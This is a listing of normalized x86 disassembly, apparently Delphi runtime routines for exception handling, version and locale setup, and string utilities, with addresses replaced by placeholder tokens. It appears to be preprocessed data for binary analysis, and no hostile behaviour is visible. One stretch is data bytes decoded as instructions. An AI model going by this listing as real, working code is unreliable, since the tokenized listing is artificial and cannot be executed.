mov edx esi
call sub_403f94
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403490
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_40ba08
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_40ba62
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov eax esi
call sub_409118
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x4 ]
call sub_403f94
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ba69
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
add esp 0xfffffff0
call sub_403490
sub_40ba69
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_40ba88
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea edx [ edi + 0x4 ]
mov eax esi
call sub_405d94
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403490
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_40bac4
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_40bb30
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_405d94
mov eax [ ebp - 0x8 ]
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
call sub_409118
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x4 ]
call sub_403f94
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40bb37
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f64
retn
add esp 0xfffffff0
call sub_403490
sub_40bb37
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_40bb84
push ebx
push esi
add esp 0xfffffff8
xor ebx ebx
call sub_4028b8
mov esi eax
jmp r-xdata
cmp ebx 0x6
jg r-xdata
cmp ebx 0x6
jg r-xdata
cmp esi [ ebx * 8 + rw-data ]
jne r-xdata
mov [ esp ] esi
mov [ esp + 0x4 ] 0x0
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bac4
mov ecx [ ebx * 8 + rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9cc
jmp r-xdata
inc ebx
mov [ eax + 0xc ] esi
pop ecx
pop edx
pop esi
pop ebx
retn
sub_40bbe8
push cs
or dl [ ebp + eax * 2 + 0x78 ]
arpl [ ebp + 0x70 ] sp
je r-xdata
pop es
arpl [ gs : eax ] cx
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x40040 ] dl
add [ eax ] al
push ebx
mov ebx edx
mov edx eax
dec dl
je r-xdata
mov edx [ rw-data ]
jmp r-xdata
dec dl
je r-xdata
push ebx
mov eax edx
jmp sub_4038f8
mov edx [ rw-data ]
jmp r-xdata
dec edx
sub dl 0x16
jb r-xdata
and eax 0xff
lea eax [ eax * 8 + rw-data ]
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
mov dl 0x1
call sub_40b9cc
mov edx eax
jmp r-xdata
jmp r-xdata
call sub_40bb84
mov edx eax
sub_40bc58
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x4 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40bcf4
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d94
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_403fd8
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] 0xb
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0xb
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x1c ]
push eax
push 0x2
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405d94
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba08
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40bcfb
lea eax [ ebp - 0x20 ]
call sub_403f40
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
sub_40bd48
mov eax [ eax ]
cmp eax 0xc0000092
jg r-xdata
cmp eax 0xc0000096
jg r-xdata
je r-xdata
sub eax 0xc00000fd
je r-xdata
je r-xdata
mov al 0x6
retn
cmp eax 0xc000008e
jg r-xdata
mov al 0xe
retn
sub eax 0x3d
je r-xdata
mov al 0xc
retn
sub eax 0xc0000093
je r-xdata
add eax 0x3fffff71
sub eax 0x2
jb r-xdata
je r-xdata
mov al 0xd
retn
jmp r-xdata
mov al 0x9
retn
dec eax
je r-xdata
je r-xdata
mov al 0x7
retn
sub eax 0xc0000005
je r-xdata
mov al 0x16
retn
mov al 0x3
retn
dec eax
je r-xdata
mov al 0x8
retn
jmp r-xdata
mov al 0xb
retn
sub eax 0x87
je r-xdata
mov al 0x5
retn
jmp r-xdata
mov al 0x4
retn
dec eax
je r-xdata
jmp r-xdata
sub_40bde0
push ebp
mov ebp esp
add esp 0xfffffe90
push ebx
push esi
xor eax eax
mov [ ebp - 0x170 ] eax
mov [ ebp - 0x14c ] eax
mov [ ebp - 0x154 ] eax
mov [ ebp - 0x150 ] eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40bf9b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov ebx [ eax - 0x4 ]
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d94
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d94
jmp r-xdata
mov eax [ ebx + 0xc ]
mov [ ebp - 0x16c ] eax
mov [ ebp - 0x168 ] 0x5
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x164 ] eax
mov [ ebp - 0x160 ] 0xb
mov [ ebp - 0x15c ] esi
mov [ ebp - 0x158 ] 0x5
lea eax [ ebp - 0x16c ]
push eax
push 0x2
lea edx [ ebp - 0x170 ]
mov eax [ rw-data ]
call sub_405d94
mov ecx [ ebp - 0x170 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba08
mov ebx eax
push 0x105
lea eax [ ebp - 0x125 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetModuleFileNameA
test eax eax
je r-xdata
mov esi [ ebx + 0x18 ]
push 0x1c
lea eax [ ebp - 0x20 ]
push eax
mov eax [ ebx + 0xc ]
push eax
call VirtualQuery
cmp [ ebp - 0x10 ] 0x1000
jne r-xdata
mov eax [ ebx + 0xc ]
mov [ ebp - 0x148 ] eax
mov [ ebp - 0x144 ] 0x5
lea eax [ ebp - 0x150 ]
lea edx [ ebp - 0x125 ]
mov ecx 0x105
call sub_4041b0
mov eax [ ebp - 0x150 ]
lea edx [ ebp - 0x14c ]
call sub_408920
mov eax [ ebp - 0x14c ]
mov [ ebp - 0x140 ] eax
mov [ ebp - 0x13c ] 0xb
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x138 ] eax
mov [ ebp - 0x134 ] 0xb
mov [ ebp - 0x130 ] esi
mov [ ebp - 0x12c ] 0x5
lea eax [ ebp - 0x148 ]
push eax
push 0x3
lea edx [ ebp - 0x154 ]
mov eax [ rw-data ]
call sub_405d94
mov ecx [ ebp - 0x154 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba08
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40bfa2
lea eax [ ebp - 0x170 ]
call sub_403f40
lea eax [ ebp - 0x154 ]
mov edx 0x3
call sub_403f64
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
sub_40bfac
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40c067
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40bd48
and eax 0xff
mov edx eax
add edx 0xfffffffd
sub edx 0x8
jb r-xdata
lea eax [ eax * 8 + rw-data ]
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
mov dl 0x1
call sub_40b9cc
mov ebx eax
jmp r-xdata
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
push ebp
call sub_40bde0
pop ecx
mov ebx eax
jmp r-xdata
dec edx
sub edx 0xa
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c06e
lea eax [ ebp - 0x10 ]
call sub_403f40
retn
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405d94
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba08
mov ebx eax
sub_40c088
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba88
mov [ rw-data ] eax
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba88
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ eax ] r-xdata
mov eax [ rw-data ]
mov [ eax ] sub_40c078
mov eax [ rw-data ]
mov edx [ r-xdata ]
mov [ eax ] edx
mov eax [ rw-data ]
mov [ eax ] sub_40bdc8
mov eax [ rw-data ]
mov [ eax ] sub_40bfac
mov eax sub_40bd14
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40bd30
mov edx [ rw-data ]
mov [ edx ] eax
retn
sub_40c10c
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov [ eax + 0xc ] 0x1
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx - 0x8 ]
xor eax eax
mov [ rw-data ] eax
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
retn
mov eax [ rw-data ]
mov [ eax + 0xc ] 0x1
mov eax [ rw-data ]
call sub_40316c
xor eax eax
mov [ rw-data ] eax
sub_40c18c
add esp 0xffffff6c
mov [ esp ] 0x94
push esp
call GetVersionExA
test eax eax
je r-xdata
add esp 0x94
retn
mov eax [ esp + 0x10 ]
mov [ rw-data ] eax
mov eax [ esp + 0x4 ]
mov [ rw-data ] eax
mov eax [ esp + 0x8 ]
mov [ rw-data ] eax
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ esp + 0xc ]
mov [ rw-data ] eax
mov eax [ esp + 0xc ]
and eax 0xffff
mov [ rw-data ] eax
jmp r-xdata
mov eax rw-data
lea edx [ esp + 0x14 ]
mov ecx 0x80
call sub_4041b0
sub_40c21c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
xor edx edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_40c2f2
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_403fd8
lea eax [ ebp - 0x8 ]
call j_sub_40440c#2
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
call sub_404400
push eax
call GetFileVersionInfoSizeA
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c2f9
lea eax [ ebp - 0x8 ]
call sub_403f40
retn
mov eax ebx
call sub_4026dc
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_40c2d5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
push eax
push ebx
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
call sub_404400
push eax
call GetFileVersionInfoA
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_4026fc
retn
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
call VerQueryValueA
test eax eax
je r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x4 ] eax
sub_40c308
push esi
push edi
mov edi edx
xor edx edx
test eax eax
je r-xdata
mov eax edx
pop edi
pop esi
retn
cmp [ eax + edi ] 0x0
je r-xdata
test edi edi
jne r-xdata
mov esi edi
dec esi
jmp r-xdata
mov al [ eax ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
test esi esi
jl r-xdata
mov dl 0x1
jmp r-xdata
mov ecx edi
sub ecx esi
and ecx 0x80000001
jns r-xdata
mov cl [ eax + esi ]
and ecx 0xff
bt [ rw-data ] ecx
jb r-xdata
test ecx ecx
jne r-xdata
dec ecx
or ecx 0xfffffffe
inc ecx
dec esi
mov al [ eax + edi ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov dl 0x2
jmp r-xdata
mov dl 0x1
sub_40c380
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_404400
mov edx esi
dec edx
call sub_40c308
sub_40c3bc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_404200
cmp esi eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_40c3e4
pop esi
pop ebx
retn
mov eax ebx
call sub_404200
mov esi eax
sub_40c3e4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor edi edi
test esi esi
jle r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_404200
cmp esi eax
jg r-xdata
mov edi esi
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x1
xor edi edi
cmp esi eax
jl r-xdata
mov dl [ ebx + eax - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
inc eax
mov edx eax
mov eax ebx
call sub_40c5f4
jmp r-xdata
inc edi
cmp esi eax
jge r-xdata
sub_40c43c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov eax edi
call sub_404200
mov [ ebp - 0xc ] eax
mov esi 0x1
mov ebx 0x1
jmp r-xdata
cmp ebx [ ebp - 0xc ]
jge r-xdata
cmp esi [ ebp - 0x4 ]
jne r-xdata
cmp esi [ ebp - 0x4 ]
jl r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] esi
mov eax [ ebp + 0x8 ]
mov [ eax ] ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp ebx [ ebp - 0xc ]
jge r-xdata
inc esi
mov al [ edi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov al [ edi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
inc ebx
mov edx ebx
mov eax edi
call sub_40c5f4
mov ebx eax
jmp r-xdata
mov edx ebx
mov eax edi
call sub_40c5f4
dec eax
mov ebx eax
sub_40c4cc
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
xor eax eax
mov [ esp ] eax
test ebx ebx
jle r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
mov eax esi
call sub_404200
cmp ebx eax
jg r-xdata
cmp ebx 0x1
jle r-xdata
mov [ esp ] ebx
cmp [ rw-data ] 0x0
je r-xdata
push esp
lea ecx [ esp + 0x8 ]
mov edx ebx
dec edx
mov eax esi
call sub_40c43c
dec ebx
cmp ebx [ esp + 0x4 ]
jg r-xdata
xor eax eax
mov [ esp ] eax
jmp r-xdata
mov eax esi
call sub_404200
cmp eax [ esp ]
jg r-xdata
inc [ esp ]
jmp r-xdata
sub_40c530
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
xor eax eax
mov [ esp ] eax
test ebx ebx
jle r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
mov eax esi
call sub_404200
cmp ebx eax
jle r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax esi
call sub_404200
mov ebx eax
mov [ esp ] ebx
push esp
lea ecx [ esp + 0x8 ]
mov edx ebx
mov eax esi
call sub_40c43c
mov eax esi
call sub_404200
cmp eax [ esp ]
jge r-xdata
mov eax esi
call sub_404200
mov [ esp ] eax
jmp r-xdata
sub_40c5b8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax 0x1
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov dl [ ebx + esi - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
mov eax ebx
call sub_404400
add eax esi
dec eax
call sub_40c590
sub_40c5f4
push ebx
push esi
mov ebx edx
mov esi eax
lea eax [ ebx + 0x1 ]
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov dl [ esi + ebx - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
mov eax esi
call sub_404400
add eax ebx
dec eax
call sub_40c590
add eax ebx
sub_40c630
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
jle r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax esi
call sub_404200
cmp ebx eax
jg r-xdata
cmp [ esi + ebx - 0x1 ] 0x5c
jne r-xdata
mov edx ebx
mov eax esi
call sub_40c380
test al al
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_40c664
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx esi
call sub_403f94
mov eax [ ebx ]
call sub_404200
mov edx eax
mov eax [ ebx ]
call sub_40c630
test al al
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx r-xdata
call sub_404208
sub_40c6a4
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
xor edi edi
mov eax ebx
call sub_404400
push eax
mov eax esi
call sub_404400
mov ebp eax
mov eax ebp
pop edx
call sub_40c768
mov ebx eax
test ebx ebx
je r-xdata
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi ebx
sub edi ebp
inc edi
sub_40c6dc
push ebx
push esi
push edi
push ebp
mov edi edx
mov esi eax
cmp [ rw-data ] 0x0
je r-xdata
mov edx edi
mov eax esi
call sub_408044
mov eax esi
call sub_404200
mov ebp eax
mov eax edi
mov edx ebp
call sub_40458c
mov ebx 0x1
cmp ebp ebx
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call j_sub_40440c
mov dl [ esi + ebx - 0x1 ]
mov [ eax + ebx - 0x1 ] dl
mov al [ esi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov eax [ edi ]
mov al [ eax + ebx - 0x1 ]
add al 0xbf
sub al 0x1a
jae r-xdata
inc ebx
mov eax edi
call j_sub_40440c
mov dl [ esi + ebx - 0x1 ]
mov [ eax + ebx - 0x1 ] dl
jmp r-xdata
inc ebx
cmp ebp ebx
jge r-xdata
mov eax edi
call j_sub_40440c
add [ eax + ebx - 0x1 ] 0x20
jmp r-xdata
sub_40c768
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebp edx
mov esi eax
xor ebx ebx
test esi esi
je r-xdata
mov eax ebx
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ esi ] 0x0
je r-xdata
test ebp ebp
je r-xdata
cmp [ ebp ] 0x0
je r-xdata
mov eax esi
call sub_408a50
mov [ esp ] eax
mov eax ebp
call sub_408a50
mov edi eax
mov edx ebp
mov eax esi
call sub_408be8
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
xor ebx ebx
mov eax ebx
sub eax esi
mov edx [ esp ]
sub edx eax
cmp edi edx
jbe r-xdata
mov edx ebx
sub edx esi
mov eax esi
call sub_40c3a4
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x2
je r-xdata
cmp [ esp + 0x4 ] 0x1
jne r-xdata
push edi
push ebp
push edi
push ebx
push 0x0
push 0x400
call CompareStringA
cmp eax 0x2
je r-xdata
inc ebx
mov edx ebp
mov eax ebx
call sub_408be8
mov ebx eax
inc ebx
sub_40c808
push ebx
push esi
mov ebx edx
mov edx ebx
call sub_40c830
mov esi eax
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov esi eax
inc eax
mov edx ebx
call sub_40c830
test eax eax
jne r-xdata
sub_40c830
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_408bd4
mov edi eax
test edi edi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov edx edi
sub edx esi
mov eax esi
call sub_40c3a4
sub al 0x1
jb r-xdata
je r-xdata
inc edi
jmp r-xdata
inc edi
mov edx ebx
mov eax edi
call sub_408bd4
mov edi eax
test edi edi
jne r-xdata
sub_40c870
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
xor edx edx
push ebp
push sub_40c8d4
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x7
lea edx [ ebp - 0x7 ]
push edx
push 0x1004
push eax
call GetLocaleInfoA
lea eax [ ebp - 0xc ]
lea edx [ ebp - 0x7 ]
mov ecx 0x7
call sub_4041b0
mov eax [ ebp - 0xc ]
push eax
call GetACP
mov edx eax
pop eax
call sub_408500
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c8db
lea eax [ ebp - 0xc ]
call sub_403f40
retn
sub_40c8e4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xffffffec
push edi
mov eax [ rw-data ]
call sub_40c870
push eax
call GetCPInfo
xor esi esi
jmp r-xdata
cmp esi 0xc
jge r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov al [ edi + esi + 0x6 ]
or al [ edi + esi + 0x7 ]
jne r-xdata
mov al [ edi + esi + 0x6 ]
mov bl [ edi + esi + 0x7 ]
sub bl al
jb r-xdata
add esi 0x2
inc ebx
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
and eax 0xff
bts [ rw-data ] eax
inc [ ebp - 0x1 ]
dec bl
jne r-xdata
sub_40c95c
push ebp
mov ebp esp
add esp 0xfffffe68
push ebx
push esi
push edi
mov [ rw-data ] 0x409
mov [ rw-data ] 0x9
mov [ rw-data ] 0x1
call GetThreadLocale
test eax eax
je r-xdata
test ax ax
je r-xdata
mov [ rw-data ] eax
mov esi r-xdata
mov edi rw-data
mov ecx 0x8
[ edi ] [ esi ]
cmp [ rw-data ] 0x2
jne r-xdata
mov edx eax
and dx 0x3ff
movzx edx dx
mov [ rw-data ] edx
movzx eax ax
shr eax 0xa
mov [ rw-data ] eax
push 0x4a
call GetSystemMetrics
test eax eax
setne al
mov [ rw-data ] al
push 0x2a
call GetSystemMetrics
test eax eax
setne bl
mov [ rw-data ] bl
test bl bl
je r-xdata
call sub_40c944
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebp
call sub_40c8e4
pop ecx
push ebp
call sub_40c8e4
pop ecx
mov eax rw-data
mov edx r-xdata
mov cl 0x20
call sub_402ca4
setne bl
mov [ rw-data ] bl
test bl bl
je r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
jmp r-xdata
mov eax 0x80
lea edx [ ebp - 0x94 ]
mov [ rw-data ] 0x0
jmp r-xdata
mov [ edx ] al
inc eax
inc edx
cmp eax 0x100
jne r-xdata
lea eax [ ebp - 0x94 ]
lea edx [ ebp - 0x196 ]
push edx
push 0x80
push eax
push 0x2
mov eax [ rw-data ]
push eax
call GetStringTypeExA
mov eax 0x80
lea edx [ ebp - 0x196 ]
add edx 0x2
dec eax
jne r-xdata
cmp [ edx ] 0x2
sete cl
mov [ rw-data ] cl
test cl cl
jne r-xdata
jmp r-xdata
sub_40cad0
push ebp
mov ebp esp
mov ecx 0x8
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
xor eax eax
push ebp
push sub_40cd9b
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_40c95c
call sub_40b2c0
cmp [ rw-data ] 0x0
je r-xdata
call GetThreadLocale
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
xor ecx ecx
mov edx 0x14
mov eax ebx
call sub_40b210
mov edx [ ebp - 0x10 ]
mov eax rw-data
call sub_403f94
lea eax [ ebp - 0x14 ]
push eax
mov ecx r-xdata
mov edx 0x1b
mov eax ebx
call sub_40b210
mov eax [ ebp - 0x14 ]
xor edx edx
call sub_408500
mov [ rw-data ] al
lea eax [ ebp - 0x18 ]
push eax
mov ecx r-xdata
mov edx 0x1c
mov eax ebx
call sub_40b210
mov eax [ ebp - 0x18 ]
xor edx edx
call sub_408500
mov [ rw-data ] al
mov cl 0x2c
mov edx 0xf
mov eax ebx
call sub_40b25c
mov [ rw-data ] al
mov cl 0x2e
mov edx 0xe
mov eax ebx
call sub_40b25c
mov [ rw-data ] al
lea eax [ ebp - 0x1c ]
push eax
mov ecx r-xdata
mov edx 0x19
mov eax ebx
call sub_40b210
mov eax [ ebp - 0x1c ]
xor edx edx
call sub_408500
mov [ rw-data ] al
mov cl 0x2f
mov edx 0x1d
mov eax ebx
call sub_40b25c
mov [ rw-data ] al
lea eax [ ebp - 0x24 ]
push eax
mov ecx r-xdata
mov edx 0x1f
mov eax ebx
call sub_40b210
mov eax [ ebp - 0x24 ]
lea edx [ ebp - 0x20 ]
call sub_40b548
mov edx [ ebp - 0x20 ]
mov eax rw-data
call sub_403f94
lea eax [ ebp - 0x2c ]
push eax
mov ecx r-xdata
mov edx 0x20
mov eax ebx
call sub_40b210
mov eax [ ebp - 0x2c ]
lea edx [ ebp - 0x28 ]
call sub_40b548
mov edx [ ebp - 0x28 ]
mov eax rw-data
call sub_403f94
mov cl 0x3a
mov edx 0x1e
mov eax ebx
call sub_40b25c
mov [ rw-data ] al
lea eax [ ebp - 0x30 ]
push eax
mov ecx r-xdata
mov edx 0x28
mov eax ebx
call sub_40b210
mov edx [ ebp - 0x30 ]
mov eax rw-data
call sub_403f94
lea eax [ ebp - 0x34 ]
push eax
mov ecx r-xdata
mov edx 0x29
mov eax ebx
call sub_40b210
mov edx [ ebp - 0x34 ]
mov eax rw-data
call sub_403f94
lea eax [ ebp - 0x8 ]
call sub_403f40
lea eax [ ebp - 0xc ]
call sub_403f40
lea eax [ ebp - 0x38 ]
push eax
mov ecx r-xdata
mov edx 0x25
mov eax ebx
call sub_40b210
mov eax [ ebp - 0x38 ]
xor edx edx
call sub_408500
test eax eax
jne r-xdata
call sub_40b498
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_403fd8
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_403fd8
jmp r-xdata
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0xc ]
mov eax rw-data
mov edx 0x4
call sub_4042c0
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0xc ]
mov eax rw-data
mov edx 0x4
call sub_4042c0
mov cl 0x2c
mov edx 0xc
mov eax ebx
call sub_40b25c
mov [ rw-data ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40cda2
lea eax [ ebp - 0x40 ]
mov edx 0x10
call sub_403f64
retn
lea eax [ ebp - 0x40 ]
push eax
mov ecx r-xdata
mov edx 0x1005
mov eax ebx
call sub_40b210
mov eax [ ebp - 0x40 ]
xor edx edx
call sub_408500
test eax eax
jne r-xdata
lea eax [ ebp - 0x3c ]
push eax
mov ecx r-xdata
mov edx 0x23
mov eax ebx
call sub_40b210
mov eax [ ebp - 0x3c ]
xor edx edx
call sub_408500
test eax eax
jne r-xdata
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_403fd8
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_403fd8
jmp r-xdata
sub_40ce50
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_40cee0
push [ fs : eax ]
